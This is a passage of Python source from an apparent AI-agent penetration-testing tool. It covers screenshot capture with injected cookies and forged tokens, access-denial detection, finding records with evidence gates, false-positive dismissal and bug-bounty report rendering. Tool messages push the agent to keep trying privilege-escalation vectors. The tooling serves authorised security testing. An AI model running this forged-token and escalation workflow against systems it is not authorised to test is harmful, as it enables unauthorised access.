        from selenium.webdriver.chrome.options import Options
        from urllib.parse import urlparse

        if chrome_bin and chromedriver_bin:
            opts = Options()
            opts.binary_location = chrome_bin
            opts.add_argument("--headless=new")
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument("--disable-gpu")
            opts.add_argument("--window-size=1440,900")
            opts.add_argument("--ignore-certificate-errors")

            service = Service(executable_path=chromedriver_bin)
            driver = webdriver.Chrome(service=service, options=opts)
            try:
                for target_url in target_urls:
                    parsed_u = urlparse(target_url)
                    host = parsed_u.hostname or ""

                    driver.execute_cdp_cmd("Network.enable", {})

                    non_cookie_headers = {k: v for k, v in merged_headers.items() if k.lower() != "cookie"}
                    if non_cookie_headers:
                        driver.execute_cdp_cmd("Network.setExtraHTTPHeaders", {"headers": non_cookie_headers})

                    if cookies_dict and host:
                        for c_k, c_v in cookies_dict.items():
                            try:
                                driver.execute_cdp_cmd("Network.setCookie", {
                                    "name": c_k,
                                    "value": c_v,
                                    "domain": host,
                                    "path": "/",
                                    "secure": target_url.startswith("https"),
                                    "httpOnly": False
                                })
                            except Exception:
                                pass

                    driver.get(target_url)

                    # Inject token into localStorage / sessionStorage for SPAs
                    auth_tok = target.state.get("auth_token") or target.state.get("forged_token") if hasattr(target, "state") and isinstance(target.state, dict) else None
                    if auth_tok:
                        try:
                            driver.execute_script('''
                                try {
                                    localStorage.setItem('token', arguments[0]);
                                    localStorage.setItem('auth_token', arguments[0]);
                                    localStorage.setItem('jwt', arguments[0]);
                                    sessionStorage.setItem('token', arguments[0]);
                                } catch(e) {}
                            ''', auth_tok)
                        except Exception:
                            pass

                    import time
                    time.sleep(max(1, delay))

                    safe_slug = re.sub(r'[^a-zA-Z0-9_\-\.]', '-', target_url).strip('-')
                    if not safe_slug:
                        safe_slug = "screenshot"
                    out_file = screenshots_dir / f"{safe_slug}.png"

                    if fullpage:
                        try:
                            total_height = driver.execute_script("return Math.max(document.body.scrollHeight, document.documentElement.scrollHeight, 900);")
                            driver.set_window_size(1440, min(int(total_height), 8000))
                            time.sleep(0.3)
                        except Exception:
                            pass

                    driver.save_screenshot(str(out_file))

                    page_text = ""
                    try:
                        page_text = driver.find_element("tag name", "body").text or ""
                    except Exception:
                        page_text = driver.page_source or ""

                    lower_text = page_text.lower()
                    lower_title = (driver.title or "").lower()

                    access_denied_signals = []
                    for phrase in [
                        "403", "401", "owner access required", "access denied",
                        "restricted to workspace owners", "restricted to owners",
                        "restricted to administrators", "admin access required",
                        "unauthorized", "permission denied", "forbidden",
                        "sign in to continue", "log in to your account"
                    ]:
                        if phrase in lower_title or phrase in lower_text:
                            access_denied_signals.append(phrase)

                    access_verdict = "DENIED / RESTRICTED" if access_denied_signals else "SUCCESS / ACCESSIBLE"

                    item_info = {
                        "url": target_url,
                        "final_url": driver.current_url or target_url,
                        "title": driver.title or target_url,
                        "response_code": 200,
                        "access_verdict": access_verdict,
                        "access_denied_signals": list(set(access_denied_signals)),
                        "file_path": str(out_file),
                        "file_name": out_file.name,
                        "file_size": out_file.stat().st_size if out_file.exists() else 0,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "technologies": [],
                    }
                    if access_denied_signals:
                        item_info["warning"] = f"PAGE INDICATES ACCESS RESTRICTION: Found '{', '.join(set(access_denied_signals))}'. This endpoint is NOT fully unlocked."
                    captured_items.append(item_info)
                selenium_success = True
            finally:
                try:
                    driver.quit()
                except Exception:
                    pass
    except Exception:
        selenium_success = False

    # Attempt 2: Fallback to gowitness binary if Selenium was not available or failed
    if not selenium_success:
        auto_install = bool(load_config().get("auto_install_missing_tools", False))
        check = ensure_tool("gowitness", emit=emit, auto_install=auto_install)
        binary = get_binary_path("gowitness") or "gowitness"

        if check["available"]:
            import tempfile
            with tempfile.TemporaryDirectory() as tmp_dir:
                jsonl_path = Path(tmp_dir) / "gowitness_results.jsonl"
                cookie_header = merged_headers.get("Cookie")

                if len(target_urls) == 1:
                    target_url = target_urls[0]
                    cmd = [
                        binary, "scan", "single",
                        "-u", target_url,
                        "-s", str(screenshots_dir),
                        "--screenshot-format", "png",
                        "--delay", str(delay),
                        "--write-jsonl",
                        "--write-jsonl-file", str(jsonl_path),
                    ]
                    if fullpage:
                        cmd.append("--screenshot-fullpage")
                    if chrome_bin:
                        cmd.extend(["--chrome-path", chrome_bin])
                    for h_k, h_v in merged_headers.items():
                        cmd.extend(["--chrome-header", f"{h_k}: {h_v}"])
                    if cookie_header:
                        clean_cookie = cookie_header.replace("'", "\\'")
                        cmd.extend(["--javascript", f"() => {{ document.cookie = '{clean_cookie}; path=/'; }}"])

                    try:
                        _run_cmd_with_heartbeat(cmd, timeout=120, emit=emit, label="gowitness (screenshot capture)")
                    except Exception as e:
                        return {"error": f"gowitness execution failed: {e}", "url": target_url}
                else:
                    targets_file = Path(tmp_dir) / "targets.txt"
                    targets_file.write_text("\n".join(target_urls) + "\n")
                    cmd = [
                        binary, "scan", "file",
                        "-f", str(targets_file),
                        "-s", str(screenshots_dir),
                        "--screenshot-format", "png",
                        "--delay", str(delay),
                        "--write-jsonl",
                        "--write-jsonl-file", str(jsonl_path),
                    ]
                    if fullpage:
                        cmd.append("--screenshot-fullpage")
                    if chrome_bin:
                        cmd.extend(["--chrome-path", chrome_bin])
                    for h_k, h_v in merged_headers.items():
                        cmd.extend(["--chrome-header", f"{h_k}: {h_v}"])
                    if cookie_header:
                        clean_cookie = cookie_header.replace("'", "\\'")
                        cmd.extend(["--javascript", f"() => {{ document.cookie = '{clean_cookie}; path=/'; }}"])

                    try:
                        _run_cmd_with_heartbeat(cmd, timeout=300, emit=emit, label="gowitness (batch screenshot capture)", heartbeat_interval=10)
                    except Exception as e:
                        return {"error": f"gowitness batch execution failed: {e}", "urls": target_urls}

                if jsonl_path.exists():
                    for line in jsonl_path.read_text().splitlines():
                        if not line.strip():
                            continue
                        try:
                            data = json.loads(line)
                            fname = data.get("file_name", "")
                            screenshot_file = str(screenshots_dir / fname) if fname else ""
                            if not (screenshot_file and os.path.exists(screenshot_file)):
                                for f in screenshots_dir.glob("*.png"):
                                    if fname and str(f).endswith(fname):
                                        screenshot_file = str(f)
                                        break

                            item_info = {
                                "url": data.get("url", ""),
                                "final_url": data.get("final_url", ""),
                                "title": data.get("title", ""),
                                "response_code": data.get("response_code", 0),
                                "file_path": screenshot_file,
                                "file_name": fname,
                                "timestamp": datetime.now(timezone.utc).isoformat(),
                                "technologies": [t.get("value") for t in data.get("technologies", []) if isinstance(t, dict) and t.get("value")],
                            }
                            if screenshot_file and os.path.exists(screenshot_file):
                                item_info["file_size"] = os.path.getsize(screenshot_file)
                            captured_items.append(item_info)
                        except Exception:
                            continue

    # Fallback to directory scan if jsonl parsing was empty
    if not captured_items:
        for f in screenshots_dir.glob("*.png"):
            captured_items.append({
                "url": target_urls[0] if target_urls else target.name,
                "file_path": str(f),
                "file_name": f.name,
                "file_size": f.stat().st_size,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            })

    if captured_items:
        update_from_gowitness(target, captured_items)
        save_target(target)

    if emit and hasattr(emit, "success"):
        emit.success(f"[✓] Gowitness captured {len(captured_items)} screenshot(s) in {screenshots_dir}")

    denied_items = [it for it in captured_items if it.get("access_verdict") == "DENIED / RESTRICTED" or it.get("warning")]
    result_payload: Dict[str, Any] = {
        "status": "success",
        "screenshots_count": len(captured_items),
        "screenshots_dir": str(screenshots_dir),
        "screenshots": captured_items
    }
    if denied_items:
        result_payload["access_verification_warning"] = (
            "CRITICAL: One or more captured screenshots display ACCESS DENIAL or RESTRICTION banners "
            "(e.g. '403 · Owner access required', 'Forbidden', 'Access Denied'). "
            "The active session has NOT achieved administrative/owner access on these routes. "
            "Do NOT record this as a successful privilege escalation. Continue testing alternative vectors (e.g. Mass Assignment, nested property injection, client JS analysis)."
        )

    return result_payload


def _lookup_curl_evidence(target: Target, request_ref: str, limit: int = 2) -> List[str]:
    """
    Pulls REAL, previously-captured request/response text for a given
    endpoint out of target.state['curl_evidence_log'] (populated by every
    curl call — see _execute_curl). This is what makes record_finding and
    export_report immune to the model retyping/inventing evidence from
    memory when it writes a finding or a report: whatever's returned here
    is exactly what the server actually sent, byte for byte, not a
    remembered approximation.
    Matches by URL containment (either direction) since request_ref is
    often a bare path/endpoint label while the log stores full URLs, and
    returns the most recent matches first — the last-run variant of a test
    (e.g. the winning Origin value) is usually the one worth citing.
    """
    if not request_ref or not hasattr(target, "state") or not isinstance(target.state, dict):
        return []
    ref_lower = request_ref.strip().lower()
    if not ref_lower:
        return []
    log = target.state.get("curl_evidence_log") or []
    matches = [
        e for e in reversed(log)
        if isinstance(e, dict) and e.get("url")
        and (ref_lower in e["url"].lower() or e["url"].lower() in ref_lower)
    ]
    return [m["raw"] for m in matches[:limit] if m.get("raw")]


def _execute_record_finding(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Logs a finding YOU have already confirmed (not a guess or a plan) into
    structured investigation memory — evidence cards, timeline, and the
    running investigation summary the orchestrator sees on every later turn.
    This does not test anything itself; it only records a result you
    already obtained via curl/spider/other tools.
    """
    title = str(args.get("title", "")).strip()
    if not title:
        return {
            "status": "no_title_given",
            "note": "Nah bro, that record_finding call had no title — I'm not logging a nameless finding. Give it a one-line title describing what was actually confirmed, then call this again.",
        }
    kind = str(args.get("kind", "interesting_endpoint")).strip().lower()
    severity = str(args.get("severity", "medium")).strip().lower()
    request_ref = str(args.get("request_ref", "")).strip()
    note = str(args.get("note", "")).strip()

    # Refuse to (re-)record something the researcher already explicitly
    # reviewed and rejected as a false positive on THIS target. Without
    # this, dismiss_finding only ever removed the PAST copy — nothing
    # stopped the very next re-test of the same endpoint from sailing
    # straight back into target.findings under a slightly different
    # title/note, which is exactly the "keeps flagging it, keeps calling
    # it vulnerable" loop a researcher correction is supposed to end.
    _dismissal = is_dismissed_as_false_positive(target, kind, request_ref)
    if _dismissal is not None:
        return {
            "status": "blocked_previously_dismissed",
            "note": (
                f"Not recording this — the researcher already reviewed and dismissed "
                f"'{kind}' on this exact endpoint as a false positive: \"{_dismissal.get('reason') or 'no reason given'}\". "
                f"Do not re-flag it again unless you have genuinely NEW evidence that "
                f"specifically addresses that stated reason (e.g. if the dismissal was "
                f"about non-deterministic/dynamic content, new evidence would mean you "
                f"confirmed the SAME exact value is tied to a specific OTHER account, not "
                f"just that the response changed again). If you believe the dismissal "
                f"itself was a mistake, say so to the researcher in plain language instead "
                f"of silently re-recording it."
            ),
        }

    raw_evidence_matches = _lookup_curl_evidence(target, request_ref)

    # EVIDENCE GUARDRAIL — the actual fix for the "LFI report had no PoC"
    # bug: a finding that names a SPECIFIC endpoint (request_ref given) but
    # has no captured request/response to back it is exactly how a report
    # ends up looking like a false positive at triage. This used to be
    # purely additive (raw_evidence attached if found, silently skipped if
    # not) — now it's a hard gate for the endpoint-specific case. Evidence
    # is looked up from curl_evidence_log, which run_terminal_command now
    # ALSO writes to for HTTP-shaped commands (see
    # _mirror_http_evidence_from_terminal), so this isn't "only use the
    # curl tool" — any HTTP PoC that actually ran against this request_ref,
    # through either path, satisfies it. request_ref-less findings (a weak
    # SSH password, a design-level issue with no single URL) aren't gated
    # here at all — there's nothing to look an HTTP evidence match up
    # against.
    no_evidence_reason = str(args.get("no_http_evidence_reason", "")).strip()
    if request_ref and not raw_evidence_matches and not no_evidence_reason:
        return {
            "status": "blocked_no_evidence",
            "note": (
                f"Not recording this yet — request_ref '{request_ref}' is given, but there's no captured "
                f"request/response for it in this session's evidence log, so the report would end up with no "
                f"real PoC attached (exactly what made an earlier finding look like a false positive at "
                f"triage). Before recording: actually hit '{request_ref}' with the curl tool (or "
                f"run_terminal_command, which now also captures HTTP evidence automatically) so the real "
                f"request/response gets saved, then call record_finding again — it'll be picked up "
                f"automatically. If this genuinely has no HTTP evidence to show (e.g. a local privilege "
                f"escalation, a weak SSH credential, something confirmed by direct observation rather than an "
                f"HTTP request), pass 'no_http_evidence_reason' explaining why, and this will record normally."
            ),
        }

    # Dedup: the storage layer's own dedup keys on the WHOLE finding dict,
    # which differs any time the title is reworded even slightly — this let
    # the same flag get logged 5+ times under different titles ("Flag
    # captured: X", "Flag confirmed: X", "Mission complete: X"...) in one
    # session, AND let the same endpoint get logged as two "different"
    # IDOR findings just because the researcher asked "is this really a
    # vuln?" and the model re-verified + re-recorded it under slightly
    # different wording. Three ways an incoming finding can turn out to be
    # the SAME finding, not a new one — checked in this order:
    existing_findings = target.findings if isinstance(target.findings, list) else []
    flag_match = _FLAG_TOKEN_PATTERN.search(f"{title} {note}")
    norm_request_ref = _normalize_endpoint(request_ref)
    matched_existing = None
    for f in existing_findings:
        if not isinstance(f, dict):
            continue
        f_text = f"{f.get('type', '')} {f.get('note', '')}"
        if flag_match:
            existing_flag = _FLAG_TOKEN_PATTERN.search(f_text)
            if existing_flag and existing_flag.group(0) == flag_match.group(0):
                return {
                    "status": "already_recorded",
                    "note": f"Already recorded — flag {flag_match.group(0)} is already in findings under '{f.get('type', '')}'. No need to log it again under a new title.",
                }
            continue
        # 1. Exact duplicate — same title, same endpoint.
        if (
            f.get("target", "").strip().lower() == request_ref.strip().lower()
            and f.get("type", "").strip().lower() == title.strip().lower()
        ):
            matched_existing = f
            break
        # 2. Same endpoint path (ignoring query string/value) + same vuln
        # category — almost certainly a re-confirmation of the SAME finding
        # under reworded title (e.g. re-verifying after the researcher asked
        # "is this really a vuln?"), not a genuinely new one. This is the
        # case the exact-match check above misses entirely.
        if (
            kind
            and f.get("kind", "").strip().lower() == kind
            and norm_request_ref
            and _normalize_endpoint(f.get("target", "")) == norm_request_ref
        ):
            matched_existing = f
            break

    if matched_existing is not None:
        return _merge_into_existing_finding(target, matched_existing, title, note, request_ref, raw_evidence_matches, emit)

    # CAUGHT IN THE WILD (PortSwigger OAuth implicit-flow lab): a finding
    # titled "OAuth Implicit Flow Authentication - Successfully
    # authenticated as 'wiener' ... via OAuth implicit flow" got recorded
    # under kind='auth_bypass' — but that's just the normal login flow
    # completing with the EXACT valid credentials the researcher supplied
    # (wiener:peter) for wiener's own account. Nothing was bypassed and no
    # OTHER identity's account was accessed; it's not a finding, it's a
    # successful step in the plan. Hard to catch every such case
    # mechanically, but the shape is recognizable: an auth-bypass/IDOR/
    # privilege-escalation-category title/note that only describes a plain
    # successful authentication/login, with no language anywhere indicating
    # a DIFFERENT identity was actually accessed. This doesn't block the
    # record — the model's explicit judgment call still wins — but flags it
    # back so a likely-bogus finding doesn't sail through silently; the
    # orchestrator prompt has the fuller doctrine on this.
    caution = None
    _watch_kinds = ("auth_bypass", "broken_auth", "authentication_bypass", "account_takeover",
                     "privilege_escalation", "idor", "access_control", "authz_bypass")
    if kind in _watch_kinds:
        combined = f"{title} {note}".lower()
        _login_language = bool(re.search(r"\b(successfully authenticated|logged? ?in|login successful|signed in)\b", combined))
        _bypass_language = bool(re.search(
            r"(without (?:a |the |knowing )?password|without knowing|no password|bypass|impersonat|"
            r"victim|different account|another user|other user'?s|swapped?|substitut|cross-account|"
            r"account takeover of|as the victim|someone else'?s account|unauthorized access to)",
            combined
        ))
        if _login_language and not _bypass_language:
            caution = (
                f"CAUTION: this finding (kind='{kind}') reads like a normal, successful login/"
                f"authentication with valid credentials you were given — not a description of "
                f"unauthorized access to a DIFFERENT identity/account. Completing the login step "
                f"itself is never a vulnerability. Before trusting this finding: does the evidence "
                f"actually show you accessing data/functionality belonging to an identity OTHER "
                f"than the one whose credentials were used? If not, call dismiss_finding on this "
                f"and keep working toward the real objective instead of reporting this as done."
            )
            if emit and hasattr(emit, "warn"):
                emit.warn(f"[!] {caution}")

    finding = {"type": title, "kind": kind, "target": request_ref, "severity": severity, "note": note}
    # Attach the REAL captured request/response for this endpoint, if any
    # was seen during this session — not what the model typed from memory.
    # This is what later feeds export_report's evidence block, so a report
    # never has to fall back on invented placeholder values like
    # "session=abc123" for something that was actually tested.
    if raw_evidence_matches:
        finding["raw_evidence"] = raw_evidence_matches

    # Save the auto-report BEFORE persisting the finding, so the path can
    # be stored ON the finding — that's what lets a later re-confirmation
    # of this same finding (see _merge_into_existing_finding above) update
    # this exact file in place instead of guessing a filename or always
    # creating a new one.
    auto_report_path = _auto_save_finding_report(target, title, kind, severity, request_ref, note, emit, raw_evidence_matches)
    if auto_report_path:
        finding["report_path"] = auto_report_path

    try:
        update_from_bac(target, findings=[finding])
        save_target(target)
    except Exception as e:
        return {"error": f"Failed to record finding: {e}"}

    # Immediate cross-target "worked" lesson — the confirmed-finding
    # counterpart to dismiss_finding's immediate "failed" lesson above.
    # Don't wait for the end-of-session LLM mining pass (_finalize_target_
    # lessons), which only fires on set_target, needs 4+ history turns,
    # and depends on an LLM call correctly summarizing the whole
    # transcript — a real confirmed technique should start helping the
    # NEXT target immediately, not only if/when that pass happens to
    # notice it. Deliberately generalized (kind + title + note, no raw
    # target hostnames/tokens/cookies) since this feeds a GLOBAL store
    # read by every future target/program, not just this one.
    try:
        sig_tags = list(target.state.get("technologies") or []) if hasattr(target, "state") and isinstance(target.state, dict) else []
        sig_tags += [t for t in re.split(r"[.\-_/:?&=]+", (request_ref or "").lower()) if t and len(t) > 2]
        if kind:
            sig_tags.append(kind)
        add_lesson(
            technique=f"{kind}: {title}" if kind and kind not in title.lower() else title,
            outcome="worked",
            tech_signature=sig_tags,
            note=note or "",
            target_name=target.name if target else "",
        )
    except Exception:
        pass  # lesson capture is best-effort and must never block a real recorded finding

    if emit and hasattr(emit, "success"):
        emit.success(f"[✓] Finding recorded: {title}")

    result = {"status": "recorded", "title": title, "kind": kind, "severity": severity}
    if raw_evidence_matches:
        result["raw_evidence_attached"] = len(raw_evidence_matches)
    if auto_report_path:
        result["report_path"] = auto_report_path
    if caution:
        result["caution"] = caution

    return result


def _execute_dismiss_finding(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Retracts a finding the researcher has reviewed and determined is NOT a
    real vulnerability (a false positive) — e.g. an endpoint whose content
    merely changes between requests because it's dynamic (live counters,
    timestamps, randomized sample data), not because of an access-control
    flaw.

    This does three things, not just one:
    1. Removes the matching entry from target.findings (and its evidence
       card) so it stops counting toward "N verified findings" and stops
       being eligible for export_report.
    2. Permanently blocks record_finding from accepting the SAME
       (kind, endpoint) pair again this target, citing the stated reason —
       see is_dismissed_as_false_positive(), checked at the top of
       _execute_record_finding.
    3. Writes an immediate cross-target lesson (hellhound/memory/lessons.py)
       so a DIFFERENT target with the same tech signature also benefits,
       rather than waiting for the end-of-session LLM lesson-mining pass
       (_finalize_target_lessons) to maybe notice it.

    A researcher correction ("that's a false positive, remove it") is
    useless if it only changes what gets said in THIS reply — it has to
    change what the orchestrator does on the NEXT tool call and in the
    NEXT session. That's what this tool is for.
    """
    reason = str(args.get("reason", "")).strip()
    if not reason:
        return {
            "status": "no_reason_given",
            "note": "Nah bro, dismiss_finding needs a reason — one sentence on WHY this isn't a real vulnerability (e.g. 'content is dynamic/live, differs between any two requests regardless of the id parameter'). That reason is what stops the same mistake from happening again.",
        }

    title = str(args.get("title", "")).strip()
    kind = str(args.get("kind", "")).strip().lower()
    request_ref = str(args.get("request_ref", "")).strip()
    norm_request_ref = _normalize_endpoint(request_ref) if request_ref else ""

    # Find and remove the matching recorded finding, if one exists — same
    # matching logic as record_finding's own dedup (exact title+endpoint,
    # then kind+normalized-endpoint). A dismiss_finding call is still
    # valid and still worth acting on even when nothing matches (e.g. the
    # researcher is preemptively rejecting a PATTERN before record_finding
    # ever ran) — it just means step 1 above is a no-op.
    existing_findings = target.findings if isinstance(target.findings, list) else []
    removed = None
    for f in existing_findings:
        if not isinstance(f, dict):
            continue
        exact_match = (
            title
            and f.get("target", "").strip().lower() == request_ref.strip().lower()
            and f.get("type", "").strip().lower() == title.strip().lower()
        )
        category_match = (
            kind
            and f.get("kind", "").strip().lower() == kind
            and norm_request_ref
            and _normalize_endpoint(f.get("target", "")) == norm_request_ref
        )
        title_only_match = (
            not request_ref and not kind and title
            and f.get("type", "").strip().lower() == title.strip().lower()
        )
        if exact_match or category_match or title_only_match:
            removed = f
            break

    if removed is not None:
        existing_findings.remove(removed)
        target.findings = existing_findings
        # Keep kind/request_ref around for the dismissal record even if the
        # researcher's call only gave a title — pull them off what was removed.
        kind = kind or str(removed.get("kind", "")).strip().lower()
        request_ref = request_ref or str(removed.get("target", ""))
        norm_request_ref = norm_request_ref or _normalize_endpoint(request_ref)
        title = title or str(removed.get("type", ""))

        # Drop the matching evidence card too, and best-effort delete its
        # auto-saved per-finding HTML report so a retracted finding can't
        # end up embedded in export_report via a stale file reference.
        evidence = target.state.get("recent_evidence")
        if isinstance(evidence, list):
            target.state["recent_evidence"] = [
                e for e in evidence
                if not (isinstance(e, dict) and e.get("title") == removed.get("type") and e.get("type") == removed.get("kind"))
            ]
        report_path = removed.get("report_path")
        if report_path:
            try:
                if os.path.exists(report_path):
                    os.remove(report_path)
            except Exception:
                pass  # best-effort cleanup — the dismissal itself still proceeds

    if not title and not kind:
        return {
            "status": "nothing_to_dismiss",
            "note": "No title/kind+request_ref given and nothing matched an existing finding — give at least a title, or a kind+request_ref, identifying what to dismiss.",
        }

    label = title or f"{kind} on {request_ref or '(no endpoint given)'}"
    try:
        dismiss_false_positive(target, item=label, reason=reason, kind=kind, endpoint=request_ref)
        # Immediate cross-target lesson — don't wait for end-of-session
        # mining, which only fires on set_target and depends on an LLM
        # call succeeding at summarizing the whole transcript correctly.
        sig_tags = [t for t in (kind, *re.split(r"[.\-_/:?&=]+", (request_ref or "").lower())) if t and len(t) > 2]
        add_lesson(
            technique=f"Flagging '{kind or 'this'}' based on response differences at {request_ref or title}",
            outcome="failed",
            tech_signature=sig_tags,
            note=f"Researcher-confirmed false positive: {reason}",
            target_name=target.name if target else "",
        )
        save_target(target)
    except Exception as e:
        return {"error": f"Failed to dismiss finding: {e}"}

    if emit and hasattr(emit, "success"):
        emit.success(f"[✓] Dismissed as false positive: {label}")

    result = {
        "status": "dismissed",
        "label": label,
        "removed_from_findings": removed is not None,
        "note": f"Removed and blocked from re-recording. '{kind or 'this'}' on this endpoint will not be flagged again on this target unless genuinely new evidence contradicts: {reason}",
    }
    return result


def _normalize_endpoint(u: str) -> str:
    """Strip query string + trailing slash + case, for comparing whether
    two request_ref values point at the SAME endpoint regardless of which
    parameter value was used to test it (e.g. ?user_id=1 vs ?user_id=10
    are the same IDOR surface, not two different findings)."""
    u = (u or "").strip().lower()
    u = u.split("?", 1)[0]
    return u.rstrip("/")


def _merge_into_existing_finding(
    target: Target, existing: Dict[str, Any], new_title: str, new_note: str,
    new_request_ref: str, new_raw_evidence: Optional[List[str]], emit: Any,
) -> Dict[str, Any]:
    """A record_finding call matched something already recorded for this
    SAME endpoint+category (see the dedup checks above) — merge the new
    evidence into the existing finding and rewrite its existing HTML file
    in place, rather than silently no-op'ing (the old behavior) or
    scattering another near-duplicate finding_<target>_<timestamp>.html
    next to it under slightly different wording (the bug this fixes)."""
    existing_title = str(existing.get("type", new_title))
    existing_note = str(existing.get("note", "")).strip()
    existing_kind = str(existing.get("kind", "")).strip().lower() or "interesting_endpoint"
    existing_severity = str(existing.get("severity", "medium")).strip().lower()

    # Only add an "Update" section if there's genuinely new information —
    # an identical re-verification shouldn't pad the file with a copy of
    # the same sentence.
    updated_note = None
    if new_note and new_note.strip().lower() != existing_note.strip().lower():
        stamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
        updated_note = f"[{stamp}] {new_note.strip()}"

    merged_evidence = list(existing.get("raw_evidence") or [])
    for r in (new_raw_evidence or []):
        if r not in merged_evidence:
            merged_evidence.append(r)
    # Cap growth — re-verifying the same IDOR 10 times shouldn't turn the
    # file into an unbounded wall of near-identical curl transcripts; keep
    # the earliest (original proof) and the most recent (latest proof).
    if len(merged_evidence) > 8:
        merged_evidence = merged_evidence[:2] + merged_evidence[-6:]
    if merged_evidence:
        existing["raw_evidence"] = merged_evidence

    try:
        save_target(target)
    except Exception as e:
        return {"error": f"Failed to update existing finding: {e}"}

    if emit and hasattr(emit, "success"):
        emit.success(f"[✓] Finding re-confirmed (merged into existing): {existing_title}")

    report_path = existing.get("report_path")
    new_path = _auto_save_finding_report(
        target, existing_title, existing_kind, existing_severity,
        new_request_ref or existing.get("target", ""), existing_note, emit,
        merged_evidence, existing_path=report_path, updated_note=updated_note,
    )
    if new_path and not report_path:
        existing["report_path"] = new_path
        try:
            save_target(target)
        except Exception:
            pass

    return {
        "status": "updated_existing",
        "title": existing_title,
        "note": f"This endpoint/category was already recorded as '{existing_title}' — merged the new evidence into that existing finding instead of logging a near-duplicate.",
        "report_path": new_path or report_path,
    }


_SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
_SEVERITY_COLOR = {
    "critical": "#ff3860", "high": "#ff7a45", "medium": "#ffc107",
    "low": "#4da3ff", "info": "#8a8f98",
}


def _html_escape(s: Any) -> str:
    import html as _html_mod
    return _html_mod.escape(str(s if s is not None else ""), quote=True)


_EVIDENCE_STATUS_RE = re.compile(r"^HTTP/[\d.]+\s+(\d+)\s*(.*)$", re.M)


def _parse_evidence_text(raw: str) -> Dict[str, Optional[str]]:
    """
    Splits ONE captured evidence string into its request/response parts for
    report-grade rendering, instead of the undifferentiated blob every
    report used to dump ("$ curl ... \\n\\n HTTP/1.1 200 OK \\n <headers> \\n
    <body>" all run together in one code block, no PoC command the
    researcher could just copy-paste, no status code called out). Both
    evidence producers (_execute_curl and _mirror_http_evidence_from_
    terminal) write the SAME "$ <command>\\n\\n<response/output>" shape, so
    this one parser covers evidence captured either way, including
    anything already saved to disk before this existed — it's a read-time
    parse of existing text, the stored format itself never changed.

    Returns {"command", "status_label", "body"} — command/status_label are
    None when nothing matched (e.g. a non-HTTP terminal command's output
    has no status line, or a legacy/minimal evidence string has no "$ "
    prefix at all); callers render around that gracefully rather than
    showing an empty section.
    """
    raw = raw or ""
    command = None
    body = raw
    if raw.startswith("$ "):
        cmd_part, sep, rest = raw.partition("\n\n")
        if sep:
            command = cmd_part[2:].strip()
            body = rest
    status_label = None
    m = _EVIDENCE_STATUS_RE.search(body)
    if m:
        code, reason = m.group(1), m.group(2).strip()
        status_label = f"HTTP {code}" + (f" {reason}" if reason else "")
    return {"command": command, "status_label": status_label, "body": body.strip()}


def _evidence_markdown_block(raw: str) -> str:
    """One captured evidence entry, rendered as a Request/Response pair in
    Markdown — copy-pasteable PoC command separated from the actual proof
    of impact, with the status code called out where one was captured."""
    parsed = _parse_evidence_text(raw)
    parts: List[str] = []
    if parsed["command"]:
        parts += ["**Request**", "", "```bash", parsed["command"], "```", ""]
    resp_label = f"**Response** ({parsed['status_label']})" if parsed["status_label"] else "**Response**"
    parts += [resp_label, "", "```", parsed["body"], "```", ""]
    return "\n".join(parts)


def _evidence_html_block(raw: str) -> str:
    """Same split as _evidence_markdown_block, rendered as HTML for the
    report page itself."""
    parsed = _parse_evidence_text(raw)
    html = ""
    if parsed["command"]:
        html += f'<div class="section-label">Request</div><pre class="code-block">{_html_escape(parsed["command"])}</pre>'
    resp_label = f"Response ({_html_escape(parsed['status_label'])})" if parsed["status_label"] else "Response"
    html += f'<div class="section-label">{resp_label}</div><pre class="code-block">{_html_escape(parsed["body"])}</pre>'
    return html


# Findings at these severities count as "a vulnerability was found" for
# the purposes of auto-saving a report. "low"/"info" are recon notes
# (interesting endpoints, directory listings, etc.) rather than confirmed
# vulnerabilities, so they don't trigger a report on their own — the
# researcher can still get one for those via an explicit export_report.
_AUTO_REPORT_SEVERITIES = {"critical", "high", "medium"}


def _finding_markdown(title: str, kind: str, severity: str, request_ref: str, note: str,
                       raw_evidence: Optional[List[str]] = None, updated_note: Optional[str] = None) -> str:
    """Render a single finding as clean, portable Markdown — the format
    HackerOne/Bugcrowd report fields actually render well (unlike the
    plain-text copy this used to produce), so it can be pasted straight
    into a submission with headers, bold labels and fenced code blocks
    intact instead of landing as one flat paragraph."""
    parts = [f"## {title}", "", f"**Severity:** {severity.upper()}  ", f"**Category:** {kind}"]
    if request_ref:
        parts.append(f"**Endpoint:** `{request_ref}`")
    parts.append("")
    if note:
        parts += ["### Evidence / Notes", "", note, ""]
    if updated_note:
        parts += ["### Update", "", updated_note, ""]
    if raw_evidence:
        label = "### Proof — Captured Request/Response" if len(raw_evidence) == 1 else "### Proof — Captured Requests/Responses"
        parts.append(label)
        parts.append("")
        for r in raw_evidence:
            parts.append(_evidence_markdown_block(r))
    return "\n".join(parts).rstrip() + "\n"


def _auto_save_finding_report(
    target: Target, title: str, kind: str, severity: str, request_ref: str, note: str, emit: Any,
    raw_evidence: Optional[List[str]] = None,
    existing_path: Optional[str] = None, updated_note: Optional[str] = None,
) -> Optional[str]:
    """
    Fires automatically every time record_finding logs a NEW confirmed
    vulnerability (severity critical/high/medium) — permanent behavior,
    not gated behind the researcher asking for "a report" or the model
    separately deciding to call export_report. A confirmed finding is
    worth a portable artifact the moment it's confirmed, not only if
    someone remembers to ask for one at the end of the session.

    Unlike export_report (which assembles a polished multi-finding report
    from a model-authored narrative), this writes a small, self-contained
    HTML file straight from the finding's own recorded fields — no extra
    authoring step required. Best-effort: any failure here is logged and
    swallowed, it must never fail the underlying record_finding call.

    existing_path: when the SAME finding (same endpoint + category) gets
    re-confirmed later in the session — e.g. the researcher asked "is this
    really a vuln?" and the model re-verified it — this rewrites that
    existing file in place with the merged evidence instead of scattering
    another near-duplicate finding_<target>_<timestamp>.html next to it.
    Only a genuinely different finding gets a brand-new file.
    """
    if severity not in _AUTO_REPORT_SEVERITIES:
        return None
    try:
        target_name = target.name if (target and target.name) else "default"
        reports_dir = Path(os.path.expanduser(f"~/.hellhound/targets/{target_name}/reports"))
